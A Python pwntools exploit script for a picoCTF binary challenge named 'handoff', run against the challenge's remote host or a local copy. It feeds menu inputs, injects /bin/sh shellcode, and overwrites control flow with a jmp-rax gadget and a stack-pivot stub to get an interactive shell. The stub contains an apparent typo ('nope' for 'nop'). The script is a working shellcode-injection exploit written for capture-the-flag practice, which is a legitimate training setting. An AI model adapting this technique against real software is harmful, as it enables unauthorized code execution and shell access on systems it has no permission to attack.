from pwn import *
host = "shape-facility.picoctf.net"
port = 65132
binary = context.binary = ELF("./handoff",checksec=False)
rop = ROP(binary)       
def conn():
    if args.LOCAL:
        return process("./handoff")
    else :
        return remote(host,port)
def main():
    # rax addr 0x7fffffffda48
    p = conn()
    p.sendline(b"1")
    p.sendline(b'ilyes')
    p.sendline(b"2")
    p.sendline(b"0")
    sc = asm(shellcraft.sh())
    print(len(sc))
    p.sendline(sc)
    p.sendline(b"3")
    jmp_rax= p64(0x40116c)
    sub =asm('nope;sub rsp, 0x2e8;jmp rsp').ljust(20,b'\x90')
    print(sub)
    print(len(sub))
    s=flat( sub,
            jmp_rax,
            )
    p.sendline(s)
    p.interactive()

if __name__ == "__main__":
     main()